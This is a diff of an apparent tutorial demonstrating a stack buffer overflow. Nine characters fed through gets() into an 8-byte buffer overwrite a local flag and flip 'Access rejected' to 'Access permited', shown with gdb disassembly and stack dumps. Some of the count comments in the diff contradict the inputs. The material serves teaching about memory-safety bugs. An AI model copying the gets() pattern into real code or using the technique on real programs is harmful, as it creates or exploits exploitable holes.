@@ -28,94 +28,133 @@ Overwrite Local Variables Using a Buffer Overflow Attack
 
 
  $ ./overwrite_local_vars 
-AAAAAAA
+AAAAAAA             // 8 times
 Access rejected!!
 
 $ ./overwrite_local_vars 
-AAAAAAAAA
+AAAAAAAAA           // 9 times
 Access permited!!
 
 
 $ gdb ./overwrite_local_vars
+
 (gdb) break 9
+Breakpoint 1 at 0x400536: file overwrite_local_vars.c, line 9.
+
 (gdb) break 24
+Breakpoint 2 at 0x400575: file overwrite_local_vars.c, line 24.
+
 (gdb) r
-Breakpoint 2, main (argc=1, argv=0xbfffefa4) at overwrite_local_vars.c:24
+Breakpoint 2, main (argc=1, argv=0x7fffffffdad8) at overwrite_local_vars.c:24
+24          read_line();
 
 (gdb) disass
-11      if(flag == 0x0)
 Dump of assembler code for function main:
-   0x0804849a <+0>: push   ebp
-   0x0804849b <+1>: mov    ebp,esp
-=> 0x0804849d <+3>: call   0x8048460 <read_line>
-   0x080484a2 <+8>: mov    eax,0x0
-   0x080484a7 <+13>:    pop    ebp
-   0x080484a8 <+14>:    ret    
-
-(gdb) x/8xw $esp
-0xbfffef08: 0x00000000  0x46cbe963  0x00000001  0xbfffefa4
-0xbfffef18: 0xbfffefac  0xb7ffe6b0  0x00000001  0x00000001
+   0x0000000000400566 <+0>:     push   rbp
+   0x0000000000400567 <+1>:     mov    rbp,rsp
+   0x000000000040056a <+4>:     sub    rsp,0x10
+   0x000000000040056e <+8>:     mov    DWORD PTR [rbp-0x4],edi
+   0x0000000000400571 <+11>:    mov    QWORD PTR [rbp-0x10],rsi
+=> 0x0000000000400575 <+15>:    mov    eax,0x0
+   0x000000000040057a <+20>:    call   0x400527 <read_line>
+>  0x000000000040057f <+25>:    mov    eax,0x0
+   0x0000000000400584 <+30>:    leave
+   0x0000000000400585 <+31>:    ret
 
 (gdb) c
 Breakpoint 1, read_line () at overwrite_local_vars.c:9
 
 (gdb) disass
 Dump of assembler code for function read_line:
-   0x08048460 <+0>: push   ebp
-   0x08048461 <+1>: mov    ebp,esp
-   0x08048463 <+3>: sub    esp,0x10
-   0x08048466 <+6>: mov    DWORD PTR [ebp-0x4],0x0
-=> 0x0804846d <+13>:    lea    eax,[ebp-0xc]
-   0x08048470 <+16>:    mov    DWORD PTR [esp],eax
-   0x08048473 <+19>:    call   0x8048310 <gets@plt>
-   0x08048478 <+24>:    cmp    DWORD PTR [ebp-0x4],0x0
-   0x0804847c <+28>:    jne    0x804848c <read_line+44>
-   0x0804847e <+30>:    mov    DWORD PTR [esp],0x8048544
-   0x08048485 <+37>:    call   0x8048320 <puts@plt>
-   0x0804848a <+42>:    jmp    0x8048498 <read_line+56>
-   0x0804848c <+44>:    mov    DWORD PTR [esp],0x8048556
-   0x08048493 <+51>:    call   0x8048320 <puts@plt>
-   0x08048498 <+56>:    leave  
-   0x08048499 <+57>:    ret    
+   0x0000000000400527 <+0>:     push   rbp
+   0x0000000000400528 <+1>:     mov    rbp,rsp
+   0x000000000040052b <+4>:     sub    rsp,0x10
+   0x000000000040052f <+8>:     mov    DWORD PTR [rbp-0x4],0x0
+=> 0x0000000000400536 <+15>:    lea    rax,[rbp-0xc]
+   0x000000000040053a <+19>:    mov    rdi,rax
+   0x000000000040053d <+22>:    mov    eax,0x0
+   0x0000000000400542 <+27>:    call   0x400440 <gets@plt>
+   0x0000000000400547 <+32>:    cmp    DWORD PTR [rbp-0x4],0x0
+   0x000000000040054b <+36>:    jne    0x400559 <read_line+50>
+   0x000000000040054d <+38>:    mov    edi,0x400620
+   0x0000000000400552 <+43>:    call   0x400430 <puts@plt>
+   0x0000000000400557 <+48>:    jmp    0x400563 <read_line+60>
+   0x0000000000400559 <+50>:    mov    edi,0x400632
+   0x000000000040055e <+55>:    call   0x400430 <puts@plt>
+   0x0000000000400563 <+60>:    nop
+   0x0000000000400564 <+61>:    leave
+   0x0000000000400565 <+62>:    ret
 
-(gdb) x/16xw $esp
-0xbfffeef0: 0x46e5e3c4  0x0000002f  0x080484bb  0x00000000
-0xbfffef00: 0xbfffef08  0x080484a2  0x00000000  0x46cbe963
-0xbfffef10: 0x00000001  0xbfffefa4  0xbfffefac  0xb7ffe6b0
-0xbfffef20: 0x00000001  0x00000001  0x00000000  0x0804a018
+(gdb) info register
+rbp            0x7fffffffd9d0   0x7fffffffd9d0
+rsp            0x7fffffffd9c0   0x7fffffffd9c0
+rip            0x400536 0x400536 <read_line+15>
+
+(gdb) x/16xg $rsp
+0x7fffffffd9c0: 0x00007fffffffd9e7      0x0000000000000000
+0x7fffffffd9d0: 0x00007fffffffd9f0      0x000000000040057f
+0x7fffffffd9e0: 0x00007fffffffdad8      0x0000000100000000
+0x7fffffffd9f0: 0x0000000000400590      0x00007f39451f950a
+0x7fffffffda00: 0x0000000000000001      0x00007fffffffdad8
+0x7fffffffda10: 0x0000000100040000      0x0000000000400566
+0x7fffffffda20: 0x0000000000000000      0x6be0b3fd859050bd
+0x7fffffffda30: 0x0000000000400450      0x00007fffffffdad0
+
 
 (gdb) s
-AAAAAAAA
+AAAAAAAA        // 7 times
 
-(gdb) x/16xw $esp
-0xbfffeef0: 0xbfffeef4  0x41414141  0x41414141  0x00000000
-0xbfffef00: 0xbfffef08  0x080484a2  0x00000000  0x46cbe963
-0xbfffef10: 0x00000001  0xbfffefa4  0xbfffefac  0xb7ffe6b0
-0xbfffef20: 0x00000001  0x00000001  0x00000000  0x0804a018
+(gdb) x/8xg $rsp
+0x7fffffffd9c0: 0x41414141ffffd9e7      0x0000000041414141
+0x7fffffffd9d0: 0x00007fffffffd9f0      0x000000000040057f
+0x7fffffffd9e0: 0x00007fffffffdad8      0x0000000100000000
+0x7fffffffd9f0: 0x0000000000400590      0x00007f39451f950a
 
-(gdb) x/w 0xbfffeefc
-0xbfffeefc: 0x00000000
+(gdb) print flag
+$1 = 0
+
+(gdb) print &flag
+$2 = (int *) 0x7fffffffd9cc
+
+(gdb) print buffer
+$3 = "AAAAAAAA"
+
+(gdb) print &buffer
+$4 = (char (*)[8]) 0x7fffffffd9c4
 
 (gdb) c
 Access rejected!!
 
 
 (gdb) r
-Breakpoint 2, main (argc=1, argv=0xbfffefa4) at overwrite_local_vars.c:24
-(gdb) n
+Breakpoint 2, main (argc=1, argv=0x7fffffffdad8) at overwrite_local_vars.c:24
+
+(gdb) s
+read_line () at overwrite_local_vars.c:6
+
+(gdb) s
 Breakpoint 1, read_line () at overwrite_local_vars.c:9
 
-(gdb) n
-AAAAAAAAA
+(gdb) s
+AAAAAAAAA       // 9 times
 
-(gdb) x/16xw $esp
-0xbfffeef0: 0xbfffeef4  0x41414141  0x41414141  0x00000041
-0xbfffef00: 0xbfffef08  0x080484a2  0x00000000  0x46cbe963
-0xbfffef10: 0x00000001  0xbfffefa4  0xbfffefac  0xb7ffe6b0
-0xbfffef20: 0x00000001  0x00000001  0x00000000  0x0804a018
+(gdb) x/8xg $rsp
+0x7fffffffd9c0: 0x41414141ffffd9e7      0x0000004141414141
+0x7fffffffd9d0: 0x00007fffffffd9f0      0x000000000040057f
+0x7fffffffd9e0: 0x00007fffffffdad8      0x0000000100000000
+0x7fffffffd9f0: 0x0000000000400590      0x00007fcd0d87c50a
 
-(gdb) p flag
-$4 = 65
+(gdb) print flag
+$5 = 65
+
+(gdb) print &flag
+$6 = (int *) 0x7fffffffd9cc
+
+(gdb) print buffer
+$7 = "AAAAAAAA"
+
+(gdb) print &buffer
+$8 = (char (*)[8]) 0x7fffffffd9c4
 
 (gdb) c
 Access permited!!
